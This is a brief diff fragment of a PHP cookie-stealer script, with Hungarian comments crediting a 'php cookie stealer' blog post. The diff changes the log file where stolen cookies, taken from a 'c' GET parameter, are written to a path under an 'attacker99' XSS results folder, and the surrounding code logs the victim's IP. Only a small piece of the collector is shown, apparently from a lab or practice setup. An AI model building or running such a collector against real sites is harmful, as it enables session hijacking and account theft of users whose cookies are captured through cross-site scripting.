@@ -5,7 +5,7 @@
 	
 	//A kód struktúrájának forrása: https://hackingandsecurity.blogspot.com/2017/09/nice-to-havephp-cookie-stealer.html
 	function logData(){
-		$ipLog="stolen_cookie.txt";
+		$ipLog="/home/attacker99/xss_attacker_result/stolen_cookie.txt";
 		$cookie = $_GET['c'];		
 		
 		//Az IP azonosítására alkalmas kód forrása: https://www.w3resource.com/php-exercises/php-basic-exercise-5.php
